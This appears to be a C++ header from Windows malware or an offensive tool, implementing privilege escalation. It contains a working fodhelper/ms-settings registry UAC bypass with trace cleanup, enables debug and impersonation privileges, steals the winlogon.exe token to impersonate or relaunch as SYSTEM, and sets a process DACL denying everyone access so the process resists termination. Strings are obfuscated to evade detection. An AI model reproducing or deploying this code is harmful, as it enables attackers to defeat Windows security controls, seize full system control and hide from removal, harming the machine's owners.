#pragma once

namespace authority {
    class c_authority {
    public:
        bool bypass_uac( ) {
            const auto reg_path = oxorany( "Software\\Classes\\ms-settings\\Shell\\Open\\command" );
            char current_exe[ MAX_PATH ];
            if ( GetModuleFileNameA( nullptr, current_exe, MAX_PATH ) == 0 ) {
                logging::print( oxorany( "Failed to get module file name" ) );
                return false;
            }

            auto command = std::string( oxorany( "cmd /c start \"\" \"" ) ) + std::string( current_exe ) + oxorany( "\" --admin" );
            if ( !set_registry_key( reg_path, command, oxorany( "" ) ) ) {
                logging::print( oxorany( "Failed to set registry key for UAC bypass" ) );
                return false;
            }

            SHELLEXECUTEINFOW sei = { sizeof( sei ) };
            sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
            sei.nShow = SW_HIDE;
            auto success = false;
            if ( ShellExecuteExW( &sei ) ) {
                Sleep( 3000 );
                delete_registry_key( reg_path );
                success = true;
                logging::print( oxorany( "UAC bypass triggered successfully" ) );
            }
            else {
                logging::print( oxorany( "ShellExecuteExW failed, error: %lu" ), GetLastError( ) );
            }
            return success;
        }


        bool lock_process_dacl( HANDLE h_process ) {
            SID_IDENTIFIER_AUTHORITY world_auth = SECURITY_WORLD_SID_AUTHORITY;
            SID_IDENTIFIER_AUTHORITY nt_auth = SECURITY_NT_AUTHORITY;

            PSID p_everyone = nullptr, p_system = nullptr, p_self = nullptr;

            if ( !AllocateAndInitializeSid( &world_auth, 1,
                SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &p_everyone ) )
                return false;

            if ( !AllocateAndInitializeSid( &nt_auth, 1,
                SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &p_system ) ) {
                FreeSid( p_everyone );
                return false;
            }

            HANDLE h_token = nullptr;
            OpenProcessToken( h_process, TOKEN_QUERY, &h_token );
            DWORD token_info_size = 0;
            GetTokenInformation( h_token, TokenUser, nullptr, 0, &token_info_size );
            auto p_token_user = ( TOKEN_USER* )malloc( token_info_size );
            GetTokenInformation( h_token, TokenUser, p_token_user, token_info_size, &token_info_size );
            p_self = p_token_user->User.Sid;
            CloseHandle( h_token );

            EXPLICIT_ACCESS ea[ 3 ] = {};
            ea[ 0 ].grfAccessPermissions = PROCESS_ALL_ACCESS;
            ea[ 0 ].grfAccessMode = DENY_ACCESS;
            ea[ 0 ].grfInheritance = NO_INHERITANCE;
            BuildTrusteeWithSid( &ea[ 0 ].Trustee, p_everyone );

            ea[ 1 ].grfAccessPermissions = PROCESS_ALL_ACCESS;
            ea[ 1 ].grfAccessMode = GRANT_ACCESS;
            ea[ 1 ].grfInheritance = NO_INHERITANCE;
            BuildTrusteeWithSid( &ea[ 1 ].Trustee, p_system );

            ea[ 2 ].grfAccessPermissions = PROCESS_ALL_ACCESS;
            ea[ 2 ].grfAccessMode = GRANT_ACCESS;
            ea[ 2 ].grfInheritance = NO_INHERITANCE;
            BuildTrusteeWithSid( &ea[ 2 ].Trustee, p_self );

            PACL p_acl = nullptr;
            if ( SetEntriesInAcl( 3, ea, nullptr, &p_acl ) != ERROR_SUCCESS ) {
                FreeSid( p_everyone );
                FreeSid( p_system );
                free( p_token_user );
                return false;
            }

            PSECURITY_DESCRIPTOR p_sd = ( PSECURITY_DESCRIPTOR )LocalAlloc( LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH );
            InitializeSecurityDescriptor( p_sd, SECURITY_DESCRIPTOR_REVISION );
            SetSecurityDescriptorDacl( p_sd, TRUE, p_acl, FALSE );

            auto result = SetKernelObjectSecurity( h_process, DACL_SECURITY_INFORMATION, p_sd );

            LocalFree( p_sd );
            LocalFree( p_acl );
            FreeSid( p_everyone );
            FreeSid( p_system );
            free( p_token_user );

            return result;
        }

        bool enable_privileges( ) {
            HANDLE token;
            if ( !OpenProcessToken( GetCurrentProcess( ),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                &token ) ) {
                logging::print( oxorany( "OpenProcessToken failed, error: %lu" ), GetLastError( ) );
                return false;
            }

            const std::vector<const wchar_t*> privileges = {
                SE_DEBUG_NAME,
                SE_IMPERSONATE_NAME,
                SE_ASSIGNPRIMARYTOKEN_NAME,
                SE_INCREASE_QUOTA_NAME
            };

            TOKEN_PRIVILEGES tp;
            LUID luid;
            auto any_enabled = false;

            std::for_each( privileges.begin( ), privileges.end( ),
                [ & ]( const wchar_t* priv_name ) {
                    if ( LookupPrivilegeValueW( nullptr, priv_name, &luid ) ) {
                        tp.PrivilegeCount = 1;
                        tp.Privileges[ 0 ].Luid = luid;
                        tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
                        if ( AdjustTokenPrivileges( token, FALSE, &tp, sizeof( tp ), nullptr, nullptr ) ) {
                            any_enabled = true;
                            logging::print( oxorany( "enabled privilege: %ls" ), priv_name );
                        }
                        else {
                            logging::print( oxorany( "failed to enable privilege: %s, error: %lu" ), priv_name, GetLastError( ) );
                        }
                    }
                    else {
                        logging::print( oxorany( "failed to find privilege %s, error: %lu" ), priv_name, GetLastError( ) );
                    }
                } );

            CloseHandle( token );
            return any_enabled;
        }

        bool impersonate_system( ) {
            auto pid = find_winlogon_pid( );
            if ( !pid )
                return false;

            enable_privileges( );

            HANDLE h_process = OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid );
            if ( !h_process )
                return false;

            HANDLE h_token = nullptr;
            if ( !OpenProcessToken( h_process, TOKEN_DUPLICATE | TOKEN_QUERY, &h_token ) ) {
                CloseHandle( h_process );
                return false;
            }

            HANDLE h_imp_token = nullptr;
            if ( !DuplicateTokenEx( h_token, MAXIMUM_ALLOWED, nullptr,
                SecurityImpersonation,
                TokenImpersonation,
                &h_imp_token ) ) {
                CloseHandle( h_token );
                CloseHandle( h_process );
                return false;
            }

            auto result = SetThreadToken( nullptr, h_imp_token );
            CloseHandle( h_imp_token );
            CloseHandle( h_token );
            CloseHandle( h_process );
            return result;
        }

        bool relaunch( ) {
            DWORD pid = find_winlogon_pid( );
            if ( !pid )
                return false;

            HANDLE h_process = OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid );
            if ( !h_process )
                return false;

            HANDLE h_token = nullptr;
            if ( !OpenProcessToken( h_process, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &h_token ) ) {
                CloseHandle( h_process );
                return false;
            }

            HANDLE h_primary = nullptr;
            if ( !DuplicateTokenEx( h_token, MAXIMUM_ALLOWED, nullptr,
                SecurityImpersonation, TokenPrimary, &h_primary ) ) {
                CloseHandle( h_token );
                CloseHandle( h_process );
                return false;
            }

            wchar_t path[ MAX_PATH ];
            GetModuleFileNameW( nullptr, path, MAX_PATH );

            wchar_t cmd_line[ MAX_PATH + 16 ];
            swprintf_s( cmd_line, L"\"%s\" --system", path );

            STARTUPINFOW si{ sizeof( si ) };
            PROCESS_INFORMATION pi{ };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOW;

            auto result = CreateProcessWithTokenW( h_primary, LOGON_WITH_PROFILE,
                nullptr, cmd_line,
                CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi );

            if ( result ) {
                CloseHandle( pi.hProcess );
                CloseHandle( pi.hThread );
            }

            CloseHandle( h_primary );
            CloseHandle( h_token );
            CloseHandle( h_process );
            return result;
        }

    private:
        DWORD find_winlogon_pid( ) const {
            HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
            if ( snapshot == INVALID_HANDLE_VALUE )
                return 0;

            PROCESSENTRY32W entry{ };
            entry.dwSize = sizeof( entry );

            if ( !Process32FirstW( snapshot, &entry ) ) {
                CloseHandle( snapshot );
                return 0;
            }

            do {
                if ( wcscmp( entry.szExeFile, L"winlogon.exe" ) == 0 ) {
                    CloseHandle( snapshot );
                    return entry.th32ProcessID;
                }
            } while ( Process32NextW( snapshot, &entry ) );

            CloseHandle( snapshot );
            return 0;
        }

        bool set_registry_key( const std::string& path, const std::string& command, const std::string& delegate_execute ) {
            HKEY hKey = nullptr;
            auto result = RegCreateKeyExA( HKEY_CURRENT_USER, path.c_str( ),
                0, nullptr, 0, KEY_WRITE,
                nullptr, &hKey, nullptr );
            if ( result != ERROR_SUCCESS ) {
                logging::print( oxorany( "RegCreateKeyExA failed, error: %ld" ), result );
                return false;
            }

            std::vector<BYTE> cmd_buffer( command.size( ) + 1 );
            std::copy( command.begin( ), command.end( ), cmd_buffer.begin( ) );
            cmd_buffer.back( ) = '\0';

            std::vector<BYTE> delegate_buffer( delegate_execute.size( ) + 1 );
            std::copy( delegate_execute.begin( ), delegate_execute.end( ), delegate_buffer.begin( ) );
            delegate_buffer.back( ) = '\0';

            result = RegSetValueExA( hKey, "", 0, REG_SZ,
                cmd_buffer.data( ),
                static_cast< DWORD >( cmd_buffer.size( ) ) );
            if ( result == ERROR_SUCCESS ) {
                result = RegSetValueExA( hKey, "DelegateExecute", 0, REG_SZ,
                    delegate_buffer.data( ),
                    static_cast< DWORD >( delegate_buffer.size( ) ) );
            }

            RegCloseKey( hKey );
            if ( result != ERROR_SUCCESS ) {
                logging::print( oxorany( "RegSetValueExA failed, error: %ld" ), result );
            }
            return result == ERROR_SUCCESS;
        }

        bool delete_registry_key( const std::string& path ) {
            auto res = RegDeleteKeyA( HKEY_CURRENT_USER, path.c_str( ) );
            if ( res != ERROR_SUCCESS ) {
                logging::print( oxorany( "RegDeleteKeyA failed, error: %ld" ), res );
            }
            return res == ERROR_SUCCESS;
        }
    };
}